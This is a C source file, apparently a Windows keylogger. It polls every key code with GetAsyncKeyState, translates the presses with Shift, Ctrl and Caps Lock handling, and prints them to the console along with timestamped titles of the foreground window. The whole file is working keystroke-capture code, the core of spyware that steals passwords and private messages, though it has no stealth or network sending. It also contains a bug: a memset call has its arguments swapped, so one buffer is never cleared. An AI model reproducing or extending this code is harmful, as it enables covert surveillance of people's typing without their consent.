#include "winkey.h"

void		log_window(SYSTEMTIME st, char *window_name)
{
	printf("\n[%02d.%02d.%04d %02d:%02d] - '%s'\n",st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, window_name);
}

void		log_key(unsigned char key)
{
	if (key_code_table[key])
	{
		if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000 || GetAsyncKeyState(VK_RSHIFT) & 0x8000) && \
			special_char_table[key_code_table[key][0]])
			printf("%c", special_char_table[key_code_table[key][0]]);
		else
			printf("%s", key_code_table[key]);
	}
	else if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9'))
	{
		if (GetAsyncKeyState(VK_LCONTROL) || GetAsyncKeyState(VK_RCONTROL))
			printf("Ctrl");
		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
			printf("Shift");
		if (key >= 'A' && key <= 'Z')
		{
			if (!GetKeyState(VK_CAPITAL) && !GetAsyncKeyState(VK_LSHIFT) && !GetAsyncKeyState(VK_RSHIFT) && !GetAsyncKeyState(VK_LCONTROL) && !GetAsyncKeyState(VK_RCONTROL))
				key = key - 'A' + 'a';
		}
		else if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000))
		{
			if (special_char_table[key])
				key = special_char_table[key];
		}
		printf("%c", key);
	}
}

int			main(void)
{
	char		title[256];
	char		prev[256];

	memset(prev, 256, '\0');
	while (1)
	{
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{
				GetWindowText(GetForegroundWindow(), title, 256);
				if (strcmp(prev, title))
				{
					SYSTEMTIME st;

					GetSystemTime(&st);
					memcpy(prev, title, strlen(title));
					prev[strlen(title)] = '\0';
					log_window(st, title);
				}
				log_key((unsigned char)i);
			}
		}
	}
}
